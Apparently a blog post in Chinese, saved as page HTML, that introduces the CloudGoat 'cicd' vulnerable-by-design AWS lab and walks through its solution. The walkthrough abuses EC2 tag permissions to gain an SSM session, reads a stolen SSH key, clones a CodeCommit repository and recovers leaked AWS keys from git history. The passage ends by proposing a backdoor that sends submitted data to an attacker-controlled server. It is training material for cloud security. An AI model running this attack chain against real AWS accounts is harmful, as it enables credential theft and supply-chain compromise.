@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="本文详细介绍了如何构建一个故意设计为易受攻击的AWS DevOps环境作为CloudGoat场景，包括架构设计、漏洞利用步骤和持续测试方法，帮助安全研究人员理解云环境中的供应链安全风险。">
+<title>构建易受攻击的AWS DevOps环境作为CloudGoat场景</title>
+
+<link rel='canonical' href='http://localhost:1313/p/%E6%9E%84%E5%BB%BA%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84aws-devops%E7%8E%AF%E5%A2%83%E4%BD%9C%E4%B8%BAcloudgoat%E5%9C%BA%E6%99%AF/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="构建易受攻击的AWS DevOps环境作为CloudGoat场景">
+<meta property='og:description' content="本文详细介绍了如何构建一个故意设计为易受攻击的AWS DevOps环境作为CloudGoat场景，包括架构设计、漏洞利用步骤和持续测试方法，帮助安全研究人员理解云环境中的供应链安全风险。">
+<meta property='og:url' content='http://localhost:1313/p/%E6%9E%84%E5%BB%BA%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84aws-devops%E7%8E%AF%E5%A2%83%E4%BD%9C%E4%B8%BAcloudgoat%E5%9C%BA%E6%99%AF/'>
+<meta property='og:site_name' content='办公AI智能小助手'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='AWS安全' /><meta property='article:tag' content='DevOps' /><meta property='article:tag' content='漏洞利用' /><meta property='article:tag' content='云安全' /><meta property='article:published_time' content='2025-08-02T17:27:26&#43;08:00'/><meta property='article:modified_time' content='2025-08-02T17:27:26&#43;08:00'/>
+<meta name="twitter:title" content="构建易受攻击的AWS DevOps环境作为CloudGoat场景">
+<meta name="twitter:description" content="本文详细介绍了如何构建一个故意设计为易受攻击的AWS DevOps环境作为CloudGoat场景，包括架构设计、漏洞利用步骤和持续测试方法，帮助安全研究人员理解云环境中的供应链安全风险。">
+
+
+<script
+  async
+  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"
+></script>
+<meta name="referrer" content="no-referrer-when-downgrade" />
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-ECH1V9TWJT"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-ECH1V9TWJT');
+        }
+      </script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_f509edb42ecc0ebd.png" width="234"
+                            height="170" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">办公AI智能小助手</a></h1>
+            <h2 class="site-description">qife的个人博客</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#cloudgoat易受攻击的aws环境">CloudGoat：易受攻击的AWS环境</a>
+      <ol>
+        <li><a href="#示例cloudgoat场景">示例CloudGoat场景</a></li>
+      </ol>
+    </li>
+    <li><a href="#贡献新的cloudgoat场景">贡献新的CloudGoat场景</a>
+      <ol>
+        <li><a href="#场景故事">场景故事</a></li>
+        <li><a href="#foocorp基础设施架构图">FooCorp基础设施架构图</a></li>
+        <li><a href="#漏洞利用步骤">漏洞利用步骤</a></li>
+      </ol>
+    </li>
+    <li><a href="#使用端到端测试进行持续测试">使用端到端测试进行持续测试</a></li>
+    <li><a href="#结论">结论</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E6%9E%84%E5%BB%BA%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84aws-devops%E7%8E%AF%E5%A2%83%E4%BD%9C%E4%B8%BAcloudgoat%E5%9C%BA%E6%99%AF/">构建易受攻击的AWS DevOps环境作为CloudGoat场景</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            本文详细介绍了如何构建一个故意设计为易受攻击的AWS DevOps环境作为CloudGoat场景，包括架构设计、漏洞利用步骤和持续测试方法，帮助安全研究人员理解云环境中的供应链安全风险。
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 02, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="构建易受攻击的aws-devops环境作为cloudgoat场景">构建易受攻击的AWS DevOps环境作为CloudGoat场景
+</h1><p>我是可丢弃安全实验室的忠实粉丝，无论是用于攻击还是防御目的（参见：在Azure中自动化配置Active Directory实验室）。在撰写《云安全漏洞与破坏：2021年回顾》之后，我想构建一个&quot;故意设计为易受攻击的AWS实验室&quot;，包含典型的攻击路径，包括静态、长期有效的凭证和供应链安全元素。</p>
+<h2 id="cloudgoat易受攻击的aws环境">CloudGoat：易受攻击的AWS环境
+</h2><p>CloudGoat是一个开源项目，包含一系列易受攻击的AWS环境，可以使用Python封装的Terraform在您自己的AWS账户中轻松创建。每个场景都有一个专用文件夹，包含其描述和解决方案。</p>
+<h3 id="示例cloudgoat场景">示例CloudGoat场景
+</h3><p>例如，您可以使用以下命令在AWS账户中启动<code>cicd</code>场景：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python cloudgoat.py create cicd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此命令将运行Terraform来启动基础设施，并显示开始使用的说明。通常，它会输出一组AWS凭证作为起点。</p>
+<h2 id="贡献新的cloudgoat场景">贡献新的CloudGoat场景
+</h2><p>直接链接：https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/cicd</p>
+<h3 id="场景故事">场景故事
+</h3><p>FooCorp是一家提供公共API的公司。FooCorp的客户每分钟都会向以下API端点提交敏感数据：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST {apiUrl}/prod/hello
+</span></span><span class="line"><span class="cl">Host: {apiHost}
+</span></span><span class="line"><span class="cl">Content-Type: text/html
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">superSecretData=...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>该API实现为一个Lambda函数，通过API Gateway公开。由于FooCorp实施了DevOps，它有一个持续部署管道，可以在几分钟内自动将Lambda函数的新版本从源代码部署到生产环境。</p>
+<p>您的任务（如果您选择接受）：您将获得一个初始的低权限IAM用户的AWS凭证集。您的目标是窃取提交给FooCorp API的敏感数据。请注意，模拟用户活动正在账户中进行，模拟对FooCorp API的活动。这是通过每分钟运行的AWS CodeBuild项目实现的。</p>
+<p>该场景包含：</p>
+<ul>
+<li>3个IAM用户</li>
+<li>1个VPC，其中包含一个位于私有子网中的EC2实例</li>
+<li>用于实现API的组件：
+<ul>
+<li>1个API Gateway</li>
+<li>1个Lambda函数</li>
+<li>1个ECR仓库</li>
+</ul>
+</li>
+<li>用于实现持续部署管道的组件：
+<ul>
+<li>1个CodePipeline管道</li>
+<li>2个CodeBuild项目</li>
+<li>1个CodeCommit仓库</li>
+</ul>
+</li>
+</ul>
+<h3 id="foocorp基础设施架构图">FooCorp基础设施架构图
+</h3><h3 id="漏洞利用步骤">漏洞利用步骤
+</h3><p>本节包含剧透！只有当您卡住了，或者不打算挑战该场景时才应阅读。点击此处跳过本节继续阅读：使用端到端测试进行持续测试</p>
+<p>当我们通过<code>python3 cloudgoat.py create cicd</code>实例化场景时，会获得一个初始的AWS IAM访问密钥：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[cloudgoat] terraform apply completed with no error code.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[cloudgoat] terraform output completed with no error code.
+</span></span><span class="line"><span class="cl">cloudgoat_output_access_key_id = AKIA254BBSG...
+</span></span><span class="line"><span class="cl">cloudgoat_output_api_url = https://4ybsnrwee1.execute-api.us-east-1.amazonaws.com/prod
+</span></span><span class="line"><span class="cl">cloudgoat_output_aws_account_id = 012345678912
+</span></span><span class="line"><span class="cl">cloudgoat_output_secret_access_key = mjV9uB....
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们可以设置<code>AWS_ACCESS_KEY_ID</code>和<code>AWS_SECRET_ACCESS_KEY</code>环境变量，或使用<code>aws-vault</code>。我更喜欢后者，因为它可以方便地同时使用CLI和AWS控制台。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ aws-vault add cloudgoat-step1
+</span></span><span class="line"><span class="cl">Enter Access Key ID:
+</span></span><span class="line"><span class="cl">Enter Secret Access Key:
+</span></span><span class="line"><span class="cl">Added credentials to profile <span class="s2">&#34;cloudgoat-step1&#34;</span> in vault
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用CLI</span>
+</span></span><span class="line"><span class="cl">$ aws-vault <span class="nb">exec</span> cloudgoat-step1 --no-session
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 打开AWS控制台</span>
+</span></span><span class="line"><span class="cl">$ aws-vault login cloudgoat-step1 --no-session
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们以名为<code>ec2-sandbox-manager</code>的用户身份进行身份验证，该用户有一个IAM策略，允许我们管理标记为<code>Environment=dev</code>的EC2实例的标签，并对标记为<code>Environment=sandbox</code>的实例执行任何SSM操作。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;Resource&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ec2:CreateTags&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ec2:DeleteTags&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;Condition&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;StringLike&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;ec2:ResourceTag/Environment&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;dev&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;Effect&#34;</span><span class="p">:</span> <span class="s2">&#34;Allow&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;Resource&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;Action&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;ssm:*&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;Condition&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;StringLike&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;ssm:ResourceTag/Environment&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;sandbox&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有一个EC2实例正在运行，标记为<code>Environment=dev</code>：</p>
+<p>我们的IAM策略不允许我们通过AWS SSM Session Manager访问该实例。但是，我们确实有权限覆盖用于访问控制的<code>Environment</code>标签：</p>
+<p>然后我们可以访问EC2实例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ aws ssm start-session --region us-east-1 --target i-030c2cba2ef533829
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Starting session with SessionId: ec2-sandbox-manager-06e2440aa9ed6f315
+</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>ssm-user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>ssm-user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>ssm-user<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在用户的主目录下，我们找到一个SSH私钥：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">cd</span>
+</span></span><span class="line"><span class="cl">$ cat .ssh/id_rsa
+</span></span><span class="line"><span class="cl">-----BEGIN RSA PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">MIIEpAIBAAKCAQEApn/Tcy
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过将其指纹与账户中其他IAM用户关联的SSH公钥进行比较，我们注意到被盗的私钥属于名为<code>cloner</code>的IAM用户：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh-keygen -f .ssh/stolen_key -l -E md5
+</span></span><span class="line"><span class="cl"><span class="m">2048</span> MD5:be:5e:49:5e:e5:d0:66:bb:91:30:3f:66:2e:97:1a:11
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ aws iam list-ssh-public-keys --user-name cloner
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;SSHPublicKeys&#34;</span>: <span class="o">[</span>
+</span></span><span class="line"><span class="cl">    <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;UserName&#34;</span>: <span class="s2">&#34;cloner&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;SSHPublicKeyId&#34;</span>: <span class="s2">&#34;APKA254BBSGPK2B5K5YQ&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;Status&#34;</span>: <span class="s2">&#34;Active&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;UploadDate&#34;</span>: <span class="s2">&#34;2021-12-27T10:34:19+00:00&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">$ aws iam get-ssh-public-key --user-name cloner --ssh-public-key-id APKA254BBSGPK2B5K5YQ --encoding PEM --output text --query <span class="s1">&#39;SSHPublicKey.Fingerprint&#39;</span> 
+</span></span><span class="line"><span class="cl">be:5e:49:5e:e5:d0:66:bb:91:30:3f:66
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>该用户恰好拥有对CodeCommit仓库的<code>codecommit:GitPull</code>权限。使用CodeCommit文档，我们可以将仓库克隆到本地机器：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod <span class="m">700</span> .ssh/stolen_key
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">AWS_REGION</span><span class="o">=</span>us-east-1
+</span></span><span class="line"><span class="cl"><span class="nv">sshKeyId</span><span class="o">=</span><span class="k">$(</span>aws iam list-ssh-public-keys --user-name cloner --output text --query <span class="s1">&#39;SSHPublicKeys[0].SSHPublicKeyId&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cat &gt;&gt; .ssh/config <span class="s">&lt;&lt;EOF
+</span></span></span><span class="line"><span class="cl"><span class="s">Host *.amazonaws.com
+</span></span></span><span class="line"><span class="cl"><span class="s">	IdentityFile ~/.ssh/stolen_key
+</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">git clone ssh://<span class="nv">$sshKeyId</span>@git-codecommit.<span class="nv">$AWS_REGION</span>.amazonaws.com/v1/repos/backend-api
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>现在我们有了应用程序的源代码！</p>
+<p>源代码中没有什么有趣的内容。然而，如果我们查看Git提交历史，有一个提交引起了我们的注意：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">39ac1aa (HEAD -&gt; master, origin/master, origin/HEAD) Added app.py
+</span></span><span class="line"><span class="cl">88055fb Added requirements.txt
+</span></span><span class="line"><span class="cl">bdf59bb Added Dockerfile
+</span></span><span class="line"><span class="cl">f1cb341 Use built-in AWS authentication instead of hardcoded keys
+</span></span><span class="line"><span class="cl">70f0181 Added buildspec.yml
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>分析这个提交的差异（<code>git show f1cb341</code>）揭示了一些泄露的AWS凭证！</p>
+<p>使用这些凭证验证AWS时，我们注意到我们刚刚攻陷了IAM用户<code>developer</code>的凭证，该用户拥有<code>codecommit:GitPush</code>和<code>codecommit:PutFile</code>权限。</p>
+<p>我们现在可以使用CodeCommit UI来后门应用程序，并等待持续部署管道将其部署到生产环境！例如，我们可以让应用程序将秘密数据记录到其日志（CloudWatch日志组<code>/aws/lambda/backend-api</code>）中。我们也可以后门应用程序，让它在每个请求上将秘密数据发送到远程、攻击者控制的服务器——或者不修改应用程序代码，而是后门Docker镜像本身。</p>
